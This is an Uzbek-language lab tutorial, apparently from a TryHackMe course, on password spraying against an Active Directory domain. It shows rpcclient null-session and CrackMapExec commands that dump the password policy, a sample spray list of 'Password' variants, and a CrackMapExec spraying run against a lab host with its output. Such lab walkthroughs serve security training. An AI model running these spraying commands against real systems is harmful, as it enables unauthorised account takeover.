

**Password spraying** — bu hujum texnikasi bo‘lib, unda ko‘plab akkauntlarga nisbatan kichik miqdordagi keng tarqalgan parollar sinab ko‘riladi. Brute-force hujumlaridan farqli ravishda, password spraying har bir akkaunt uchun faqat bir necha urinish bilan cheklanadi va shu orqali akkauntlarning bloklanib qolishidan qochadi. Bu usul ko‘plab tashkilotlarda uchraydigan yomon parol amaliyotlaridan foydalanadi.

Password spraying ko‘pincha samarali bo‘ladi, chunki ko‘plab tashkilotlar:

* Parollarni tez-tez o‘zgartirishni talab qiladi, bu esa foydalanuvchilarning bashorat qilish oson bo‘lgan naqshlarni tanlashiga olib keladi (masalan, `Summer2025!`).
* Parol siyosatini yetarli darajada qat’iy nazorat qilmaydi.
* Bir xil yoki keng tarqalgan parollarni bir nechta akkauntlarda qayta ishlatadi.

Password spraying uchun keng tarqalgan parol ro‘yxatlariga quyidagilar kiradi:

* Mavsumiy parollar
* IT jamoalari tomonidan ishlatiladigan standart parollar (`Password123`)
* Ma’lumotlar sizib chiqishida fosh bo‘lgan parollar (masalan, `rockyou.txt`)

---

## Parol siyosati

Hujumni boshlashdan oldin nishon tizimning parol siyosatini tushunish juda muhim. Bu bizga quyidagi ma’lumotlarni aniqlash imkonini beradi:

* Parolning minimal uzunligi
* Murakkablik talablari
* Necha marta noto‘g‘ri urinish akkauntni bloklashiga olib kelishi

---

## rpcclient

Biz **rpcclient** yordamida **null session** orqali domen kontrolleridan (DC) parol siyosatini so‘rashimiz mumkin:

```bash
rpcclient -U "" 10.211.11.10 -N
```

Shundan so‘ng `getdompwinfo` buyrug‘ini ishga tushiramiz:

**Terminal misoli**

```text
rpcclient $> getdompwinfo
min_password_length: 12
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

---

## CrackMapExec

**CrackMapExec** — Windows muhitlarida keng qo‘llaniladigan tarmoq ekspluatatsiya vositasi. Ushbu modul davomida undan tez-tez foydalanamiz. U quyidagi imkoniyatlarni taqdim etadi:

* Enumeratsiya
* Buyruqlarni bajarish
* Post-ekspluatatsiya hujumlari

CrackMapExec SMB, LDAP, RDP va SSH kabi turli tarmoq protokollarini qo‘llab-quvvatlaydi. Agar anonim kirish ruxsat etilgan bo‘lsa, parol siyosatini hech qanday akkaunt ma’lumotisiz quyidagi buyruq orqali olish mumkin:

**Terminal misoli**

```bash
crackmapexec smb 10.211.11.10 --pass-pol
```

**Natija:**

```text
SMB         10.211.11.10    445    DC               [*] Windows Server 2019 Datacenter 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True)
SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
SMB         10.211.11.10    445    DC               Minimum password length: 18
SMB         10.211.11.10    445    DC               Password history length: 21
SMB         10.211.11.10    445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Password Complexity Flags: 000001
SMB         10.211.11.10    445    DC                   Domain Refuse Password Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Store Cleartext: 0
SMB         10.211.11.10    445    DC                   Domain Password Lockout Admins: 0
SMB         10.211.11.10    445    DC                   Domain Password No Clear Change: 0
SMB         10.211.11.10    445    DC                   Domain Password No Anon Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Complex: 1
SMB         10.211.11.10    445    DC               
SMB         10.211.11.10    445    DC               Minimum password age: 1 day 4 minutes
SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.211.11.10    445    DC               Locked Account Duration: 30 minutes
SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
SMB         10.211.11.10    445    DC               Forced Log off Time: Not Set
```

---

## Password Spraying hujumini bajarish

Oldingi bosqichda foydalanuvchilar ro‘yxatini muvaffaqiyatli yig‘dik. Endi esa kichik va keng tarqalgan parollar ro‘yxatini yaratishimiz kerak.

Parol siyosatidan ko‘rdikki, **parol murakkabligi = 1**:

* rpcclient’da: `password_properties: 0x00000001`
* CrackMapExec’da: `Password Complexity Flags: 000001`

Bu shuni anglatadiki, parol quyidagi to‘rtta shartdan kamida uchtasiga javob berishi kerak:

* Katta harflar
* Kichik harflar
* Raqamlar
* Maxsus belgilar

Shuningdek, parolda foydalanuvchi nomi yoki uning to‘liq ismidan ketma-ket ikki belgidan ortiq qism bo‘lishi mumkin emas. Microsoft’ning parol murakkabligi talablari haqida ko‘proq ma’lumotni tegishli havoladan olish mumkin.

Faraz qilaylik, OSINT orqali ushbu kompaniya ma’lumotlar sizib chiqishida qatnashgani va ba’zi parollar `"Password"` so‘zining turli variantlaridan iborat ekanligi aniqlangan. Shunga mos ravishda quyidagi parol ro‘yxatini tuzishimiz mumkin:

```text
Password!
Password1
Password1!
P@ssword
Pa55word1
```

---

## CrackMapExec yordamida hujum

Endi **WRK** kompyuteriga qarshi password spraying hujumini amalga oshiramiz:

**Terminal misoli**

```bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```

**Natija:**

```text
SMB         10.211.11.20    445    WRK              [*] Windows 10.0 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Guest:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgt:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\DC$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\WRK$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-]
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [+] tryhackme.loc\*****:******
```

Oxirgi qatordagi **`[+]`** belgisi biz **to‘g‘ri login va parol juftligini topganimizni** bildiradi.
